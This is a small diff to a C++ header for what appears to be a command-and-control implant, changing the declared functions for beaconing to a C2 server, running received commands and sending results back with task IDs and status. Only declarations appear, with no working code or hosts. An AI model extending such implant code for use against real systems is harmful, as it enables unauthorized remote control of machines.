@@ -18,6 +18,8 @@ struct Session {
 
 BOOL  PingC2();
 DWORD BeaconLoop(const Session& session);
-BOOL SendBeacon(const Session& session, std::wstring& taskOut);
-BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);
-std::wstring ExecuteCommand(const std::wstring& cmd);
+BOOL SendBeacon(const Session& session, std::wstring& taskOut,
+                std::wstring& tidOut, bool& dupOut);
+BOOL SendResult(const std::wstring& sessionId, const std::wstring& tid,
+                const std::wstring& status, const std::wstring& output);
+std::wstring ExecuteCommand(const std::wstring& cmd, std::wstring& statusOut);
